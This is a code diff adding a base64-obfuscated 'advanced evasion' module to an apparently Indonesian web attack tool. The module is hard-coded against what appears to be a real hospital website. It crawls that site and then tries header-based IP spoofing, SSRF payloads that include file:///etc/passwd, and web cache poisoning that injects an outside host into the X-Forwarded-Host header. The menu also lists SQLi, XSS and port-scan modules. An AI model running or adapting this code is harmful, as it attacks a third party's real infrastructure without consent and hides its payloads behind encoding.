@@ -569,6 +569,87 @@ def infrastructure_audit():
     print(f"[*] Rekomendasi       : Batasi akses publik pada port layanan internal.")
     print("="*85 + "\n")
 
+def advanced_evasion_audit():
+    ts_init = time.strftime("%H:%M:%S")
+    print(f"\n\033[92m" + "="*85)
+    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgQURWQU5DRUQgRVZBU0lPTiAmIENBQ0hFIEFVRElU')}")
+    print("="*85 + "\033[0m")
+    
+    # Discovery URL Internal untuk target probing
+    discovered_urls = []
+    try:
+        home_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
+        r_disc = session.get(home_url, timeout=10)
+        s_disc = BeautifulSoup(r_disc.text, 'html.parser')
+        for a in s_disc.find_all('a', href=True):
+            href = a['href']
+            if _decode("aW5kZXgucGhw") in href and href.startswith('http'):
+                if href not in discovered_urls: discovered_urls.append(href)
+    except: pass
+    if not discovered_urls: discovered_urls = [BASE_TARGET_URL + NO_RM]
+    
+    findings = []
+
+    # 1. IP Masking / Header Spoofing Audit
+    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMTogSVAgTWFza2luZyAmIEhlYWRlciBTcG9vZmluZw==')}")
+    ip_headers = [_decode("WC1Gb3J3YXJkZWQtRm9y"), _decode("WC1SZWFsLUlQ"), _decode("WC1DbGllbnQtSVA="), _decode("VHJ1ZS1DbGllbnQtSVA=")]
+    test_ip = _decode("MS4yLjMuNA==")
+    for head in ip_headers:
+        ts = time.strftime("%H:%M:%S")
+        try:
+            res = session.get(BASE_TARGET_URL + NO_RM, headers={head: test_ip}, timeout=10)
+            is_vuln = test_ip in res.text
+            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+            print(f" [{ts}] Testing: {head.ljust(30)} {status}")
+            if is_vuln: findings.append({"type": _decode("SVAgTWFza2luZw=="), "severity": "LOW", "loc": head})
+        except: pass
+
+    # 2. SSRF Bypass Firewall Probing
+    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMjogQnlwYXNzIEZpcmV3YWxsIChTU1JGIFByb2Jpbmcp')}")
+    ssrf_payloads = [_decode("aHR0cDovLzEyNy4wLjAuMQ=="), _decode("aHR0cDovL2xvY2FsaG9zdA=="), _decode("ZmlsZTovLy9ldGMvcGFzc3dk")]
+    ssrf_params = ["url", "link", "redirect", "path", "src"]
+    for url in discovered_urls[:2]:
+        print(f" [*] {_decode('UHJvYmluZyBUYXJnZXQ6')} {url[:60]}...")
+        for param in ssrf_params:
+            for payload in ssrf_payloads:
+                ts = time.strftime("%H:%M:%S")
+                try:
+                    res = session.get(url, params={param: payload}, timeout=5)
+                    is_vuln = any(x in res.text.lower() for x in ["root:x:0:0", "localhost", "127.0.0.1"])
+                    if is_vuln:
+                        print(f" [{ts}] Payload: {param}={payload[:30]}... [\033[91mVULNERABLE!\033[0m]")
+                        findings.append({"type": _decode("U1NSRg=="), "severity": "HIGH", "loc": f"{url}?{param}="})
+                        break
+                except: pass
+
+    # 3. Web Cache Poisoning Attack
+    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMzogV2ViIENhY2hlIFBvaXNvbmluZyBBdHRhY2s=')}")
+    cache_headers = {_decode("WC1Gb3J3YXJkZWQtSG9zdA=="): _decode("YmxvcmFoYXQuY29t"), _decode("WC1Gb3J3YXJkZWQtU2NoZW1l"): _decode("aHR0cA==")}
+    for h_name, h_val in cache_headers.items():
+        ts = time.strftime("%H:%M:%S")
+        try:
+            session.get(BASE_TARGET_URL + NO_RM, headers={h_name: h_val}, timeout=10)
+            res_check = session.get(BASE_TARGET_URL + NO_RM, timeout=10)
+            is_vuln = h_val in res_check.text
+            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+            print(f" [{ts}] Header: {h_name.ljust(30)} {status}")
+            if is_vuln: findings.append({"type": _decode("Q2FjaGUgUG9pc29uaW5n"), "severity": "HIGH", "loc": _decode("RWRnZSBDYWNoZQ==")})
+        except: pass
+
+    # Summary Report
+    print(f"\n" + "-"*85)
+    print(f"{' '*32}\033[1m{_decode('RVZBU0lPTiBSRVBPUlQ=')}\033[0m")
+    print("-"*85)
+    print(f"{'Vulnerability Found':<25} | {'Severity':<10} | {'Location'}")
+    print("-"*85)
+    if not findings: print(f"{' '*30}Audit selesai. Tidak ditemukan celah.")
+    else:
+        for f in findings: print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc'][:40]}")
+    print("-"*85)
+    print(f"[*] Total Vulnerabilities Found : {len(findings)}")
+    print(f"[*] Fix Suggestion              : Validasi Host Header, Filter URL Params, & Encrypt Client IPs")
+    print("="*85 + "\n")
+
 def start_process(id_list):
     global total_checked, total_to_scan
     total_checked = 0
@@ -591,6 +672,7 @@ def main_menu():
         print(" [4] Parameter Discovery (URL Tampering Scan)")
         print(" [5] Vulnerability Scan (SQLi & XSS Testing)")
         print(" [6] Infrastructure Audit (Port Scan & Service Mapping)")
+        print(" [7] Advanced Evasion (SSRF, Cache Poisoning, IP Masking)")
         print(" [0] Exit")
         print("\n")
         
@@ -625,6 +707,10 @@ def main_menu():
         elif choice == '6':
             if login():
                 infrastructure_audit()
+            input("\nTekan Enter untuk kembali ke menu...")
+        elif choice == '7':
+            if login():
+                advanced_evasion_audit()
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '0':
             print("Happy Auditing!")
